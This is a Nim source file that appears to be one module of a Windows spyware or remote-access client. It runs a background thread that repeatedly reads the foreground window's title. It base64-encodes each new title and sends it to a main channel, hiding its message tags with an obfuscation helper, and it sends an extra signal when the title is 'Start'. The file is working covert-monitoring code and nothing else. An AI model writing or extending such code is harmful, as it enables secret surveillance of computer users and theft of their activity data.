from os import sleep

from base64 import encode

from winim/inc/windef import LPWSTR
from winim/inc/windef import HWND

from winim/inc/winuser import GetForegroundWindow
from winim/inc/winuser import GetWindowTextW

from winim/winstr import winstrConverterWStringToLPWSTR
from winim/winstr import newWString
from winim/winstr import `$`

from ../functions/hideString import e
from ../functions/hideString import d

from ../constants import BUFFER_LENGTH

from ../flags import WINDOW_NAME_THREAD_CHECK_INTERVAL

from ../channels import mainChannel

type windowNameResult = tuple[worked: bool, data: string]

proc getWindowName(): windowNameResult =
  result = (false, "")

  var
    lpString: LPWSTR = newWString(BUFFER_LENGTH)
  let
    hWnd: HWND = GetForegroundWindow()

  if hWnd != 0:
    if GetWindowTextW(hWnd, lpString, BUFFER_LENGTH) != 0:
      result.data = $lpString

      if result.data != "":
        result.worked = true

proc initWindowNameThread*(): void {.thread.} =
  var prevWindowName: string = ""

  while true:
    let (worked, windowName) = getWindowName()

    if worked == true and windowName != prevWindowName:
      mainChannel.send (d e "wn", encode windowName)

      ## documented in client.nim
      if windowName == d e "Start":
        mainChannel.send (d e "sd", "")

      prevWindowName = windowName

    sleep(WINDOW_NAME_THREAD_CHECK_INTERVAL)
